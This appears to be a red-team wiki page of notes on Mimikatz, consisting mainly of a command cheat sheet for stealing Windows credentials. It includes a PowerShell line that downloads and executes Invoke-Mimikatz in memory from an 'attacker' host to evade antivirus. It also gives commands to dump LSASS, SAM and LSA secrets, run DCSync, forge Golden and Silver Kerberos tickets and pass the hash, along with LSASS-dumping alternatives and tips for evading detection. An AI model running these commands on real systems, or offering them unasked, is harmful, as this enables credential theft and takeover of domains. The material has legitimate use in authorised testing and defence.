---
title: Mimikatz
permalink: /wiki/offsec-notes/entities/mimikatz/
layout: single
author_profile: true
tags:
- offsec-notes
- tool
---

# Mimikatz

**Type:** Tool
**Also known as:** mimi
**Related:** [Active Directory Attacks](/wiki/offsec-notes/concepts/active-directory-attacks/), [Pass The Hash](/wiki/offsec-notes/concepts/pass-the-hash/), [Post Exploitation](/wiki/offsec-notes/concepts/post-exploitation/), [Kerberoasting](/wiki/offsec-notes/concepts/kerberoasting/)

## Description
Mimikatz is a credential extraction tool for Windows, developed by Benjamin Delpy. It can extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory (LSASS), perform pass-the-hash, pass-the-ticket, and Golden/Silver ticket attacks. Extremely heavily signatured — detected by virtually all AV/EDR. Use in-memory loaders or alternatives (Pypykatz for Linux, lsassy for remote extraction) in red team contexts.

## Usage / Details

### Running
```cmd
mimikatz.exe
# Or in PowerShell via reflective loading (bypasses disk-based AV):
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

### Essential Commands

#### Privilege
```
privilege::debug        # Enable SeDebugPrivilege (required for LSASS access)
token::elevate          # Impersonate SYSTEM token
```

#### Credential Extraction (LSASS)
```
sekurlsa::logonpasswords          # Dump all creds from LSASS (plaintext + hashes)
sekurlsa::wdigest                 # WDigest plaintext (Windows < 8.1 or if enabled)
sekurlsa::msv                     # NTLM hashes only
sekurlsa::kerberos                # Kerberos creds
sekurlsa::tspkg                   # TS/RemoteDesktop credentials
```

#### SAM / LSA Secrets
```
lsadump::sam                      # Local SAM hashes (needs SYSTEM)
lsadump::secrets                  # LSA secrets (service account passwords, cached creds)
lsadump::cache                    # Domain cached credentials (DCC2)
```

#### DCSync (Remote NTDS.dit dump)
```
lsadump::dcsync /domain:domain.local /all /csv    # All hashes
lsadump::dcsync /domain:domain.local /user:krbtgt # Specific user (KRBTGT for Golden Ticket)
```

#### Kerberos Tickets
```
sekurlsa::tickets /export        # Export all tickets to .kirbi files
kerberos::list /export           # List and export current session tickets
kerberos::ptt ticket.kirbi       # Inject ticket into current session (PtT)
kerberos::purge                  # Remove all tickets
```

#### Golden Ticket
```
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<NTLM> /ptt
# /ptt = inject immediately; or omit to save as ticket.kirbi
```

#### Silver Ticket
```
kerberos::golden /user:Admin /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:<service_account_NTLM> /ptt
```

#### Pass-the-Hash
```
sekurlsa::pth /user:admin /domain:domain.local /ntlm:<hash> /run:cmd.exe
```

### LSASS Dump Alternatives (avoid dropping mimikatz to disk)
```powershell
# comsvcs.dll minidump (built into Windows)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id lsass.dmp full

# ProcDump (Microsoft signed)
procdump.exe -accepteula -ma lsass lsass.dmp

# Then analyze offline:
pypykatz lsa minidump lsass.dmp   # Linux-based analysis
# Or transfer to Windows and load in mimikatz:
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

## OPSEC Notes
- Mimikatz itself is signatured by every major AV.
- `sekurlsa::logonpasswords` triggers Sysmon Event 10 (process access to LSASS).
- Credential Guard (Windows 10+) isolates credentials in VSM — WDigest/NTLM extraction from LSASS fails.
- Use `lsassy` (remote extraction without dropping binary), `nanodump` (custom LSASS dumper), or Cobalt Strike's `logonpasswords` BOF equivalent.

## References
- Mimikatz GitHub — github.com/gentilkiwi/mimikatz
- Benjamin Delpy — blog.gentilkiwi.com
- "Mimikatz Cheatsheet" — adsecurity.org
